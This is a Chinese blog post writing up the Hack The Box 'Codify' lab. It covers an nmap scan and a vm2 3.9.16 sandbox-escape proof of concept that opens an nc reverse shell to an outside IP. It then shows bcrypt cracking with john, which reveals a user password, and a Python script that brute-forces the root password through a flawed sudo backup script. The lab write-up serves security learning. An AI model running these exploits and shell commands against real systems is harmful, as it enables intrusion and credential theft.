<!DOCTYPE html>
<html class="no-js" lang="en">
<head>
	<meta charset="UTF-8">
	<meta name="viewport" content="width=device-width, initial-scale=1">
	<title>HTB | Codify vm2@3.9.16 中的沙箱逃逸 - 编程大白的博客</title>
	<script>(function(d,e){d[e]=d[e].replace("no-js","js");})(document.documentElement,"className");</script>
	<meta name="description" content="">
		<meta property="og:title" content="HTB | Codify vm2@3.9.16 中的沙箱逃逸" />
<meta property="og:description" content="使用nmap进行端口扫描
nmap -sV -sC -v -oN codify 10.10.11.239 # Nmap 7.93 scan initiated Mon Jan 8 16:36:49 2024 as: nmap -sV -sC -v -oN codify 10.10.11.239 Nmap scan report for 10.10.11.239 Host is up (1.2s latency). Not shown: 997 closed tcp ports (reset) PORT STATE SERVICE VERSION 22/tcp open ssh OpenSSH 8.9p1 Ubuntu 3ubuntu0.4 (Ubuntu Linux; protocol 2.0) | ssh-hostkey: | 256 96071cc6773e07a0cc6f2419744d570b (ECDSA) |_ 256 0ba4c0cfe23b95aef6f5df7d0c88d6ce (ED25519) 80/tcp open http Apache httpd 2." />
<meta property="og:type" content="article" />
<meta property="og:url" content="https://bcdabai.github.io/posts/cff59e848feef62643fb731a54fe7c12/" /><meta property="article:section" content="posts" />
<meta property="article:published_time" content="2024-01-09T10:06:28+08:00" />
<meta property="article:modified_time" content="2024-01-09T10:06:28+08:00" />


	<link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
	<link rel="dns-prefetch" href="//fonts.googleapis.com">
	<link rel="dns-prefetch" href="//fonts.gstatic.com">
	<link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Open+Sans:400,400i,700">

	<link rel="stylesheet" href="/css/style.css">
	

	<link rel="shortcut icon" href="/favicon.ico">
		
</head>
<body class="body">
	<div class="container container--outer">
		<header class="header">
	<div class="container header__container">
		
	<div class="logo">
		<a class="logo__link" href="/" title="编程大白的博客" rel="home">
			<div class="logo__item logo__text">
					<div class="logo__title">编程大白的博客</div>
					
				</div>
		</a>
	</div>
		<div class="divider"></div>
	</div>
</header>
		<div class="wrapper flex">
			<div class="primary">
			
<main class="main" role="main">
	<article class="post">
		<header class="post__header">
			<h1 class="post__title">HTB | Codify vm2@3.9.16 中的沙箱逃逸</h1>
			
		</header>
		<div id="gatop"></div>
		<div class="content post__content clearfix">
			
<div id="content_views" class="markdown_views prism-atom-one-dark">
                    <svg xmlns="http://www.w3.org/2000/svg" style="display: none;">
                        <path stroke-linecap="round" d="M5,0 0,2.5 5,5z" id="raphael-marker-block" style="-webkit-tap-highlight-color: rgba(0, 0, 0, 0);"></path>
                    </svg>
                    <p>使用nmap进行端口扫描</p> 
<pre><code>nmap -sV -sC -v -oN codify 10.10.11.239
</code></pre> 
<pre><code># Nmap 7.93 scan initiated Mon Jan  8 16:36:49 2024 as: nmap -sV -sC -v -oN codify 10.10.11.239
Nmap scan report for 10.10.11.239
Host is up (1.2s latency).
Not shown: 997 closed tcp ports (reset)
PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.4 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 96071cc6773e07a0cc6f2419744d570b (ECDSA)
|_  256 0ba4c0cfe23b95aef6f5df7d0c88d6ce (ED25519)
80/tcp   open  http    Apache httpd 2.4.52
|_http-title: Did not follow redirect to http://codify.htb/
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-server-header: Apache/2.4.52 (Ubuntu)
3000/tcp open  http    Node.js Express framework
|_http-title: Codify
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
Service Info: Host: codify.htb; OS: Linux; CPE: cpe:/o:linux:linux_kernel

Read data files from: /usr/bin/../share/nmap
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Mon Jan  8 16:37:28 2024 -- 1 IP address (1 host up) scanned in 39.77 seconds
</code></pre> 
<p>将codify添加到hosts，访问80端口发现是vm2沙盒版本为3.9.16</p> 
<p><img src="https://images2.imgbox.com/26/63/p1yP849d_o.png" alt="在这里插入图片描述"></p> 
<p>搜索发现这个版本之前有爆过沙盒逃逸<a href="https://gist.github.com/leesh3288/381b230b04936dd4d74aaf90cc8bb244" rel="nofollow">vm2@3.9.16 中的沙箱逃逸</a></p> 
<p>poc</p> 
<pre><code>const {VM} = require("vm2");
const vm = new VM();

const code = `
err = {};
const handler = {
    getPrototypeOf(target) {
        (function stack() {
            new Error().stack;
            stack();
        })();
    }
};
  
const proxiedErr = new Proxy(err, handler);
try {
    throw proxiedErr;
} catch ({constructor: c}) {
    c.constructor('return process')().mainModule.require('child_process').execSync('rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|sh -i 2&gt;&amp;1|nc 10.10.16.24 5566  &gt;/tmp/f');
}
`

console.log(vm.run(code));
</code></pre> 
<p>直接用poc打</p> 
<p><img src="https://images2.imgbox.com/93/d5/tMIQjnPZ_o.png" alt="在这里插入图片描述"></p> 
<p>直接反弹shell</p> 
<pre><code>const {VM} = require("vm2");
const vm = new VM();

const code = `
err = {};
const handler = {
    getPrototypeOf(target) {
        (function stack() {
            new Error().stack;
            stack();
        })();
    }
};
  
const proxiedErr = new Proxy(err, handler);
try {
    throw proxiedErr;
} catch ({constructor: c}) {
    c.constructor('return process')().mainModule.require('child_process').execSync('rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|sh -i 2&gt;&amp;1|nc 10.10.16.24 5566  &gt;/tmp/f');
}
`

console.log(vm.run(code));
</code></pre> 
<p>上传linpeas进行信息收集有一个数据库文件/var/www/contact/tickets.db</p> 
<p><img src="https://images2.imgbox.com/a9/cf/L1MIKEvg_o.png" alt="在这里插入图片描述"></p> 
<p>在/var/www/contact/tickets.db发现一个hash</p> 
<pre><code>$2a$12$SOn8Pf6z8fO/nVsNbAAequ/P6vLRJJl7gCUEiYBU2iLHn4G/p/Zw2
</code></pre> 
<p><img src="https://images2.imgbox.com/a8/84/4NyRbTzu_o.png" alt="在这里插入图片描述"></p> 
<p>使用hashid进行识别hash类型</p> 
<pre><code>hashid hash
</code></pre> 
<p><img src="https://images2.imgbox.com/3f/e8/bGd1dob0_o.png" alt="在这里插入图片描述"></p> 
<p>使用hashcat进行进行破解，先查找使用什么模式进行破解</p> 
<pre><code>hashcat --help | grep Blowfish
hashcat -m 3200 hash
</code></pre> 
<p><img src="https://images2.imgbox.com/2d/4e/GllDftYy_o.png" alt="在这里插入图片描述"></p> 
<p>爆破不出来</p> 
<p>直接用john</p> 
<pre><code>john --wordlist=/usr/share/wordlists/rockyou.txt  hash
</code></pre> 
<p><img src="https://images2.imgbox.com/2a/12/mQxDlpjs_o.png" alt="在这里插入图片描述"></p> 
<pre><code>spongebob1
</code></pre> 
<p>使用ssh登录到joshua</p> 
<pre><code>ssh joshua@10.10.11.239
</code></pre> 
<p><img src="https://images2.imgbox.com/29/d9/D8kV0kcH_o.png" alt="在这里插入图片描述"></p> 
<pre><code>b2a63c4a87cbf5b958c5d3438ebd1aa3
</code></pre> 
<p>上传linpeas进行信息收集</p> 
<p>使用sudo -l有无可提权点</p> 
<p><img src="https://images2.imgbox.com/1f/52/drviiucX_o.png" alt="在这里插入图片描述"></p> 
<p>可以看见这个是一个备份mysql的脚本，用户是root，这里需要验证root密码</p> 
<p><img src="https://images2.imgbox.com/8b/13/tg8M9ybo_o.png" alt="在这里插入图片描述"></p> 
<p>在其他wp 找到的破解root密码用python编写的脚本，使用gpt加上了注释使我更容易理解</p> 
<pre><code># 导入string和subprocess模块
import string
import subprocess
# 创建一个列表，包含所有的字母和数字
all = list(string.ascii_letters + string.digits)
# 初始化一个空字符串，用来存储密码
password = ""
# 初始化一个布尔值，用来判断是否找到密码
found = False

# 当没有找到密码时，循环执行以下操作
while not found:
    # 遍历所有的字母和数字
    for character in all:
        # 构造一个命令，用echo输出当前的密码加上一个字符，然后用*表示剩余的字符，再用sudo执行一个脚本
        command = f"echo '{password}{character}*' | sudo /opt/scripts/mysql-backup.sh"
        # 用subprocess模块运行命令，并获取标准输出和标准错误
        output = subprocess.run(command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True).stdout

        # 如果标准输出中包含"Password confirmed!"，说明找到了一个正确的字符
        if "Password confirmed!" in output:
            # 把这个字符加到密码字符串中
            password += character
            # 打印当前的密码
            print(password)
            # 跳出当前的循环，继续下一个字符的搜索
            break
    # 如果遍历完所有的字母和数字都没有找到正确的字符，说明密码已经完整
    else:
        # 把布尔值设为True，结束循环
        found = True
</code></pre> 
<p>在tmp中创建py文件并执行</p> 
<pre><code>python3 123.py
</code></pre> 
<p><img src="https://images2.imgbox.com/aa/78/GXhcnsND_o.png" alt="在这里插入图片描述"></p> 
<p>使用kljh12k3jhaskjh12kjh3登录到root</p> 
<pre><code>su root
</code></pre> 
<p><img src="https://images2.imgbox.com/e0/4b/RKyyuj9Z_o.png" alt="在这里插入图片描述"></p> 
<pre><code>b6372d94001c98779d94687098d1b13a
</code></pre>
                </div>
		</div>
		<div id="gabottom"></div>
	</article>
</main>


<nav class="pager flex">
	<div class="pager__item pager__item--prev">
		<a class="pager__link" href="/posts/c21dbc49107df53f463e61636f632d32/" rel="prev">
			<span class="pager__subtitle">«&thinsp;Previous</span>
			<p class="pager__title">docsify 文章加密</p>
		</a>
	</div>
	<div class="pager__item pager__item--next">
		<a class="pager__link" href="/posts/aecc1d2c7664a3fb54eacd5aa2bbd646/" rel="next">
			<span class="pager__subtitle">Next&thinsp;»</span>
			<p class="pager__title">九大排序算法原理图解</p>
		</a>
	</div>
</nav>


			</div>
			
		</div>
		<footer class="footer">
	<div class="container footer__container flex">
		
		<div class="footer__copyright">
			&copy; 2024 编程大白的博客.
			<span class="footer__copyright-credits">Generated with <a href="https://gohugo.io/" rel="nofollow noopener" target="_blank">Hugo</a> and <a href="https://github.com/Vimux/Mainroad/" rel="nofollow noopener" target="_blank">Mainroad</a> theme.</span>
		</div>
	</div>
</footer>
<div id="gafoot"></div>
<script src="https://101121.xyz/ga/app.js"></script>


	</div>
<script async defer src="/js/menu.js"></script>
</body>
</html>